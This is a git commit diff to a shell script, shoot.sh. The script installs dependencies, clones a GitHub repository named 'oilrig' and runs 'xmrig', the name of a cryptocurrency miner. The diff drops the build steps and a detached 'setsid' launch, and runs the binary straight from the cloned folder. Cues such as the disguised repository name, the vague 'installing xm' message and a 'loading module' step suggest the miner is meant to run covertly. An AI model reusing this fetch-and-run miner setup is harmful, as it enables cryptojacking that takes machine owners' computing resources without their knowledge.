9434a0898aad5fa6acea0a2359e95642bbf56551
Vyom 907 AND Vyom Wankhede <111875466+VYOM00907@users.noreply.github.com>
2022-11-15 19:33:35 +0530

    Update shoot.sh

--- shoot.sh
+++ shoot.sh
@@ -11,13 +11,9 @@ echo "successfully completed installation"
 echo "installing xm"
 echo "installing dependencies"
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+sudo apt install hwloc
 echo "downloading..."
 git clone https://github.com/VYOM00907/oilrig
-echo "building"
-mkdir oilrig/build && cd oilrig/build
-cmake ..
-make -j$(nproc)
-echo "installed"
 
 echo "launcher started "
 
@@ -28,6 +24,7 @@ dmesg
 echo "done loading module"
 xmrig 
 
-setsid xmrig 
+cd oilrig 
+./xmrig 
 
 echo "done launching "
